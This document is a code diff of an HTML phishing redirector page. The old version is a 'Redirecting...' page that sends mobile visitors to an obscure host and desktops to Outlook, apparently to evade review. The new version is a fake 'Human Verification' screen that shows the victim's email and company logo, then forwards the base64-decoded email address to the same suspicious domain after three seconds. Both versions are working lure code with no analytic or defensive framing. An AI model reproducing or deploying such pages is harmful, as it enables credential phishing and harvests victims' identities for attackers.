@@ -3,168 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Human Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f7f9fc;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background: #f00;
+            color: white;
+            text-align: center;
             margin: 0;
             padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        .container {
-            text-align: center;
-            background-color: white;
+        .logo {
+            width: 90px;
+            margin-bottom: 15px;
+            background: white;
+            padding: 10px;
             border-radius: 8px;
-            padding: 40px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            max-width: 90%;
-            width: 400px;
-        }
-        h1 {
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 30px;
         }
         .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 36px;
-            height: 36px;
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #FFFFFF;
             border-radius: 50%;
-            border-left-color: #2196F3;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin-bottom: 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .progress-bar {
-            height: 4px;
-            background-color: #e0e0e0;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            position: relative;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            background-color: #2196F3;
-            position: absolute;
-            left: 0;
-            top: 0;
-            width: 0%;
-            animation: fill 2s linear forwards;
-        }
-        @keyframes fill {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-        noscript {
-            display: block;
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #ffebee;
-            color: #c62828;
-            border-radius: 4px;
+        .message {
+            margin: 15px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img id="companyLogo" class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrcShr3RSZ_oTBXT9cpKv9hMAllBOx858n5UH27h4jg4Gfsg35OM_NT0sHzzW8-jylvGM&usqp=CAU" alt="Logo" />
-        <div class="spinner"></div>
-        <h1>Please wait</h1>
-        <p>Verifying and redirecting to your destination...</p>
-        <div class="progress-bar">
-            <div class="progress-bar-fill"></div>
-        </div>
-        <noscript>
-            <p>JavaScript is required to proceed. Please enable JavaScript in your browser settings and reload the page.</p>
-        </noscript>
-    </div>
-
-    <!-- Simple device detection and redirect script -->
     <script>
-    (function() {
-        const REDIRECT_DELAY = 800;
-
-        // Mobile device detection function
-        function isMobileDevice() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
-        }
-        
-        // Check if string is a valid email
-        function isValidEmail(email) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-        }
-        
-        // Try to decode base64 if needed, return the email
-        function getEmailFromFragment(fragment) {
-            // First check if the fragment itself is a valid email
-            if (isValidEmail(fragment)) {
-                return fragment;
-            }
-            
-            // Otherwise try to decode it as base64
+        (function(){
+            let email = window.location.hash.substring(1);
             try {
-                const decoded = atob(fragment);
-                if (isValidEmail(decoded)) {
-                    return decoded;
+                let decodedEmail = atob(email);
+                if (decodedEmail.includes('@')) {
+                    email = decodedEmail;
                 }
-            } catch (e) {
-                console.error("Failed to decode fragment as base64");
+            } catch (e) {}
+
+            if (!email || !email.includes('@')) {
+                email = '';
             }
-            
-            // Return null if neither approach worked
-            return null;
-        }
-        
-        // Main redirect function
-        function performRedirect() {
-            // Get the fragment (everything after #)
-            const fragment = window.location.hash.substring(1);
-            
-            // If there's no fragment, do nothing
-            if (!fragment) {
-                console.log("No email found in URL");
-                return;
-            }
-            
-            // Get email from fragment (handles both raw and base64)
-            const email = getEmailFromFragment(fragment);
-            
-            if (!email) {
-                console.error("No valid email found in URL fragment");
-                return;
-            }
-            
-            console.log("Processing email:", email);
-            
-            // Check if the device is mobile
-            if (isMobileDevice()) {
-                // Redirect mobile devices to the original destination
-                const redirectUrl = "https://j6v5Q.vfpivdvc.es/20W88RBI@jH6vuA6/$" + email;
-                console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
-            } else {
-                // Redirect non-mobile devices to Outlook
-                console.log("Non-mobile device detected. Redirecting to Outlook.");
-                window.location.href = "https://outlook.office365.com/";
-            }
-        }
-        
-        // Execute redirect after a short delay
-        setTimeout(performRedirect, REDIRECT_DELAY);
-    })();
+
+            const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            const targetUrl = email ? `https://j6v5Q.vfpivdvc.es/20W88RBI@jH6vuA6/${email}` : 'https://j6v5Q.vfpivdvc.es/20W88RBI@jH6vuA6/';
+
+            document.body.innerHTML = `
+                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
+                <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
+                <div class="spinner"></div>
+                <p class="message" id="statusMsg">Please wait while we complete the verification...</p>
+            `;
+
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 3000);
+        })();
     </script>
 </body>
 </html>
